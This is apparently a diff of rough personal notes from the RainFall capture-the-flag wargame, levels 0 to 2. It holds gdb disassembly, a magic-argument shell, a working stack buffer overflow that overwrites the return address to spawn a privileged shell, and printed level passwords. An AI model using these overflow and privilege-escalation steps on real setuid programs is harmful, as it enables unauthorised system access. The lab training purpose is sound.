@@ -16,20 +16,21 @@ total 732K
 level0@RainFall:~$ file level0
 file level0
 level0: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=0x85cf4024dbe79c7ccf4f30e7c601a356ce04f412, not stripped
-level0@RainFall:~$ strings ./level0 
-strings ./level0
 -bash: /usr/bin/strings: Input/output error
 target file -> $HOME/../level1/.pass
 level0@RainFall:~$ readelf -p .rodata ./level0  -> no relevant info for what i see.
+level0@RainFall:~$ ./level0
+Segmentation fault (core dumped)
+level0@RainFall:~$ ./level0 a
+No !
 level0@RainFall:~$ ./level0 $HOME/../level1/.pass
 ./level0 $HOME/../level1/.pass
 No !
 objdump -t ./level0
 08084e30  w    F .text	0000000c getgid
 08054670  w    F .text	0000000c geteuid
-08084da0 g     F .text	00000038 __execve
-08054640 g     F .text	00000024 execv
-gdb -batch -ex 'file level0' -ex 'set disassembly-flavor intel' -ex 'disassemble main'
+08084da0 g     F .text	00000038 __execve0
+8054640 g     F .text	00000024 execv
 gdb -batch -ex 'file level0' -ex 'set disassembly-flavor intel' -ex 'disassemble main'
 Dump of assembler code for function main:
    0x08048ec0 <+0>:	push   ebp
@@ -37,15 +38,15 @@ Dump of assembler code for function main:
    0x08048ec3 <+3>:	and    esp,0xfffffff0
    0x08048ec6 <+6>:	sub    esp,0x20
    0x08048ec9 <+9>:	mov    eax,DWORD PTR [ebp+0xc]
-   0x08048ecc <+12>:	add    eax,0x4
+   0x08048ecc <+12>:	add    eax,0x4 -> mv to the first param
    0x08048ecf <+15>:	mov    eax,DWORD PTR [eax]
-   0x08048ed1 <+17>:	mov    DWORD PTR [esp],eax
-   0x08048ed4 <+20>:	call   0x8049710 <atoi>
-   0x08048ed9 <+25>:	cmp    eax,0x1a7
-   0x08048ede <+30>:	jne    0x8048f58 <main+152>
+   0x08048ed1 <+17>:	mov    DWORD PTR [esp],eax  -> pass param
+   0x08048ed4 <+20>:	call   0x8049710 <atoi> -> call atoi
+   0x08048ed9 <+25>:	cmp    eax,0x1a7 -> echo 'ibase=16;1A7' | bc -> 423 -> if != 423 
+   0x08048ede <+30>:	jne    0x8048f58 <main+152> -> error No !
    0x08048ee0 <+32>:	mov    DWORD PTR [esp],0x80c5348
    0x08048ee7 <+39>:	call   0x8050bf0 <strdup>
-   0x08048eec <+44>:	mov    DWORD PTR [esp+0x10],eax
+   0x08048eec <+44>:	mov    DWORD PTR [esp+0x10],eax eax = /bin/sh
    0x08048ef0 <+48>:	mov    DWORD PTR [esp+0x14],0x0
    0x08048ef8 <+56>:	call   0x8054680 <getegid>
    0x08048efd <+61>:	mov    DWORD PTR [esp+0x1c],eax
@@ -57,18 +58,18 @@ Dump of assembler code for function main:
    0x08048f16 <+86>:	mov    DWORD PTR [esp+0x4],eax
    0x08048f1a <+90>:	mov    eax,DWORD PTR [esp+0x1c]
    0x08048f1e <+94>:	mov    DWORD PTR [esp],eax
-   0x08048f21 <+97>:	call   0x8054700 <setresgid>
+   0x08048f21 <+97>:	call   0x8054700 <setresgid> -> set groupid
    0x08048f26 <+102>:	mov    eax,DWORD PTR [esp+0x18]
    0x08048f2a <+106>:	mov    DWORD PTR [esp+0x8],eax
    0x08048f2e <+110>:	mov    eax,DWORD PTR [esp+0x18]
    0x08048f32 <+114>:	mov    DWORD PTR [esp+0x4],eax
    0x08048f36 <+118>:	mov    eax,DWORD PTR [esp+0x18]
    0x08048f3a <+122>:	mov    DWORD PTR [esp],eax
-   0x08048f3d <+125>:	call   0x8054690 <setresuid>
+   0x08048f3d <+125>:	call   0x8054690 <setresuid> -> set userid
    0x08048f42 <+130>:	lea    eax,[esp+0x10]
    0x08048f46 <+134>:	mov    DWORD PTR [esp+0x4],eax
    0x08048f4a <+138>:	mov    DWORD PTR [esp],0x80c5348
-   0x08048f51 <+145>:	call   0x8054640 <execv>
+   0x08048f51 <+145>:	call   0x8054640 <execv> -> llama execv
    0x08048f56 <+150>:	jmp    0x8048f80 <main+192>
    0x08048f58 <+152>:	mov    eax,ds:0x80ee170
    0x08048f5d <+157>:	mov    edx,eax
@@ -82,3 +83,263 @@ Dump of assembler code for function main:
    0x08048f85 <+197>:	leave  
    0x08048f86 <+198>:	ret    
 End of assembler dump.
+gdb level0
+b strdup
+r 423
+fin
+p (char *)$eax
+$2 = 0x80f2718 "/bin/sh"
+level0@RainFall:~$ ./level0 423
+$ hola
+/bin/sh: 1: hola: not found
+$ whoami
+level1
+$ env
+USER=level0
+HOME=/home/user/level0
+OLDPWD=/home/user/level0
+LOGNAME=level0
+SHELL=/bin/bash
+PWD=/home/user/level0
+$ cat $HOME/../level1/.pass -> Don't like this sintax. ;(
+cat: /home/user/level0/../level1/.pass: Permission denied
+$ cat /home/user/level1/.pass
+1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a
+########
+# level1
+level0@RainFall:~$ su level1
+Password:1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a
+  GCC stack protector support:            Enabled
+  Strict user copy checks:                Disabled
+  Restrict /dev/mem access:               Enabled
+  Restrict /dev/kmem access:              Enabled
+  grsecurity / PaX: No GRKERNSEC
+  Kernel Heap Hardening: No KERNHEAP
+ System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level1/level1
+#### let's find what we got
+level1@RainFall:~$ uname -r
+3.2.0-90-generic-pae
+level1@RainFall:~$ ls -lhtrA
+total 17K
+-rw-r--r--  1 level1 level1  675 Apr  3  2012 .profile
+-rw-r--r--  1 level1 level1  220 Apr  3  2012 .bash_logout
+-rw-r--r--+ 1 level1 level1   65 Sep 23  2015 .pass
+-rw-r--r--  1 level1 level1 3.5K Sep 23  2015 .bashrc
+-rwsr-s---+ 1 level2 users  5.1K Mar  6  2016 level1
+#are we group user ?
+level1@RainFall:~$ groups
+level1 users
+#Yes
+#nm and strings return the same error
+-bash: /usr/bin/strings         : Input/output error
+level1@RainFall:~$ ./level1
+hola # -> read from stdin.
+level1@RainFall:~$
+# let's try to detect what is happening
+level1@RainFall:~$ readelf -p .rodata ./level1
+
+String dump of section '.rodata':
+  [     8]  Good... Wait what?^J
+  [    1c]  /bin/sh
+# Look like the input maybe a execve | system /bin/sh
+level1@RainFall:~$ gdb -batch -ex 'file level1' -ex 'set disassembly-flavor intel' -ex 'disassemble main'
+Dump of assembler code for function main:
+   0x08048480 <+0>:	push   ebp
+   0x08048481 <+1>:	mov    ebp,esp
+   0x08048483 <+3>:	and    esp,0xfffffff0
+   0x08048486 <+6>:	sub    esp,0x50
+   0x08048489 <+9>:	lea    eax,[esp+0x10]
+   0x0804848d <+13>:	mov    DWORD PTR [esp],eax
+   0x08048490 <+16>:	call   0x8048340 <gets@plt> -> gets -> read for stdin
+   0x08048495 <+21>:	leave  
+   0x08048496 <+22>:	ret    
+End of assembler dump.
+# looks like the /bin/sh is not used in this part.
+level1@RainFall:~$ readelf -s level1
+Symbol table '.dynsym' contains 8 entries:
+   Num:    Value  Size Type    Bind   Vis      Ndx Name
+     1: 00000000     0 FUNC    GLOBAL DEFAULT  UND gets@GLIBC_2.0 (2) -> gets@plt assembly
+     3: 00000000     0 FUNC    GLOBAL DEFAULT  UND system@GLIBC_2.0 (2) -> call to system maybe is interesting
+
+Symbol table '.symtab' contains 69 entries:
+   Num:    Value  Size Type    Bind   Vis      Ndx Name
+    40: 00000000     0 FILE    LOCAL  DEFAULT  ABS level1.c -> below are functions defined in the file
+    50: 08048444    60 FUNC    GLOBAL DEFAULT   13 run -> a function inside maybe interesting
+    66: 08048480    23 FUNC    GLOBAL DEFAULT   13 main
+#let's look to run function
+level1@RainFall:~$ gdb -batch -ex 'file level1' -ex 'set disassembly-flavor intel' -ex 'disassemble run'
+   0x08048444 <+0>:	push   ebp
+   0x08048445 <+1>:	mov    ebp,esp
+   0x08048447 <+3>:	sub    esp,0x18
+   0x0804844a <+6>:	mov    eax,ds:0x80497c0 -> probably the first string  [     8]  Good... Wait what?^J
+   0x0804844f <+11>:	mov    edx,eax
+   0x08048451 <+13>:	mov    eax,0x8048570
+   0x08048456 <+18>:	mov    DWORD PTR [esp+0xc],edx
+   0x0804845a <+22>:	mov    DWORD PTR [esp+0x8],0x13
+   0x08048462 <+30>:	mov    DWORD PTR [esp+0x4],0x1
+   0x0804846a <+38>:	mov    DWORD PTR [esp],eax
+   0x0804846d <+41>:	call   0x8048350 <fwrite@plt> -> fwrite
+   0x08048472 <+46>:	mov    DWORD PTR [esp],0x8048584 -> probably the second string [    1c]  /bin/sh
+   0x08048479 <+53>:	call   0x8048360 <system@plt> -> system the one is interesting
+   0x0804847e <+58>:	leave  
+   0x0804847f <+59>:	ret    
+# let's try it
+level1@RainFall:~$ gdb ./level1
+..
+(gdb) b main
+Breakpoint 1 at 0x8048483
+(gdb) r
+Starting program: /home/user/level1/level1 
+
+Breakpoint 1, 0x08048483 in main ()
+(gdb) bt # -> searching  for maybe a _start function to have an if or something to run run
+#0  0x08048483 in main ()
+(gdb) jump run # jump to run function
+Continuing at 0x804844a.
+Good... Wait what? # Then i got a shell
+$ whoami 
+level1 # cause gdb is who launched the process ->
+#####
+# This is a security measure to prevent abuse of SUID binaries via debugging tools.  
+Specifically, the kernel checks if the process is being traced (e.g., by gdb). If so, it drops the SUID elevation  to the real UID of the user. This means the program will run with your original permissions, not the owner's
+# https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/
+
+####
+buffer overflow.
+
+$ ./level1 # let's try to test with getstr to modify the value of something.
+i write 10456 spaces and
+Segmentation fault (core dumped)
+$ $ whoami
+level1
+# let's try use gets for overwrite the return of main (stack) to call run.
+#no we want to search eip for modify the next instruction to execute.
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Program received signal SIGSEGV, Segmentation fault.
+0x00414141 in ?? ()
+(gdb) i r eip
+eip            0x414141	0x414141
+# i added one more 'A'
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA the offset is 80 - 4 = 76 char and then the payload
+0x41414141 in ?? ()
+eip            0x41414141	0x41414141
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB should#SHOULD change now to 42424242
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+(gdb) i r eip
+eip            0x42424242	0x42424242
+offset = 76 bits
+PAYLOAD=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+How to transform to little endian
+address = 0x8048360
+0xb7ee41f0       & 0xff = first_byte  -> first_byte = $(($address        & 0xff))
+0xb7ee41f0 >> 8  & 0xff = second_byte -> secon_byte = $(($address >> 8   & 0xff))
+0xb7ee41f0 >> 16 & 0xff = third_byte  -> third_byte = $(($address >> 16  & 0xff))
+0xb7ee41f0 >> 24 & 0xff = last_byte   -> forth_byte = $(($address >> 24  & 0xff))
+level1@RainFall:~$ printf '\x60\x83\x04\x08' >> /tmp/payload_level1
+payload= offset + execve_addr + return_address (whatever) + /bin/sh addr + null_addr + null addr
+OFFSET=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+How to transform to little endian
+address = 0xb7ee41f0
+0xb7ee41f0       & 0xff = first_byte  -> first_byte = $(($address        & 0xff))
+level1@RainFall:~$ echo $((address & 0xff)) 
+240
+level1@RainFall:~$ echo "obase=16;$((address & 0xff))" | bc
+F0                 
+0xb7ee41f0 >> 8  & 0xff = second_byte -> secon_byte = $(($address >> 8   & 0xff))
+0xb7ee41f0 >> 16 & 0xff = third_byte  -> third_byte = $(($address >> 16  & 0xff))
+0xb7ee41f0 >> 24 & 0xff = last_byte   -> forth_byte = $(($address >> 24  & 0xff))
+level1@RainFall:~$cat --help
+Usage: cat [OPTION]... [FILE]...
+  -b, --number-nonblank    number nonempty output lines, overrides -n
+  -e                       equivalent to -vE
+  -E, --show-ends          display $ at end of each line
+  -n, --number             number all output lines
+  -s, --squeeze-blank      suppress repeated empty output lines
+  -t                       equivalent to -vT
+  -T, --show-tabs          display TAB characters as ^I
+  -u                       (ignored)
+  -v, --show-nonprinting   use ^ and M- notation, except for LFD and TAB
+      --help     display this help and exit
+      --version  output version information and exit
+
+With no FILE, or when FILE is -, read standard input.
+
+Examples:
+  cat f - g  Output f's contents, then standard input, then g's contents. # Interesting we could pass the payload and then read stdin. ;)
+  cat        Copy standard input to standard output.
+#Generation Payload  
+echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA$(printf '\x44\x84\x04\x08')" > /tmp/payload_level1
+ # I need the jump line to getstr end. with -n don't let the subshell put the newline or write it in stdin 
+
+level1@RainFall:~$ cat /tmp/payload_level1 - | ./level1
+Good... Wait what?
+whoami
+level2
+id
+uid=2030(level1) gid=2030(level1) euid=2021(level2) egid=100(users) groups=2021(level2),100(users),2030(level1)
+cat /home/user/level2/.pass
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+Segmentation fault (core dumped)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+####################
+# Level2
+####################
+level1@RainFall:~$ su level2
+Password: 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level2/level2
+#
+(gdb) info functions
+All defined functions:
+
+Non-debugging symbols:
+0x08048358  _init
+0x080483a0  printf
+0x080483a0  printf@plt
+0x080483b0  fflush
+0x080483b0  fflush@plt
+0x080483c0  gets
+0x080483c0  gets@plt
+0x080483d0  _exit
+0x080483d0  _exit@plt
+0x080483e0  strdup
+0x080483e0  strdup@plt
+0x080483f0  puts
+0x080483f0  puts@plt
+0x08048400  __gmon_start__
+0x08048400  __gmon_start__@plt
+0x08048410  __libc_start_main
+0x08048410  __libc_start_main@plt
+0x08048420  _start
+0x08048450  __do_global_dtors_aux
+0x080484b0  frame_dummy
+0x080484d4  p
+0x0804853f  main
+0x08048550  __libc_csu_init
+0x080485c0  __libc_csu_fini
+0x080485c2  __i686.get_pc_thunk.bx
+0x080485d0  __do_global_ctors_aux
+0x080485fc  _fini
+
+#let's take the adrres of /bin/sh -> maybe useful later
+(gdb) find &system, +9999999, "/bin/sh"
+0xb7f8cc58
